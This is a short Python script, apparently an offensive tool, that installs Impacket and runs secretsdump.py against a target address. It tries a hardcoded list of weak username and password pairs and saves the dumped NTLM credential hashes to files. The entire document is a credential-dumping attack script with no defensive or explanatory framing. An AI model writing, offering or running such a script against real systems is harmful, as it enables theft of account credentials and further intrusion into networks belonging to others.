import os

def dump_ntlm_hashes(target_ip, credentials):
    # Ensure Impacket is installed
    try:
        os.system("pip install impacket")
    except Exception as e:
        print(f"Error installing Impacket: {e}")
        return
    
    for username, password in credentials:
        print(f"Attempting to dump NTLM hashes with username: {username} and password: {password}")
        # Run secretsdump.py from Impacket
        command = f"secretsdump.py {username}:{password}@{target_ip} > ntlm_hashes_{username}.txt"
        os.system(command)
        print(f"Hashes for {username} saved to ntlm_hashes_{username}.txt")

if __name__ == "__main__":
    target_ip = "192.168.1.100"  # Replace with target IP

    # List of (username, password) tuples
    credentials = [
        ("Administrator", "password123"),
        ("User1", "passw0rd"),
        ("User2", "123456"),
    ]
    
    dump_ntlm_hashes(target_ip, credentials)
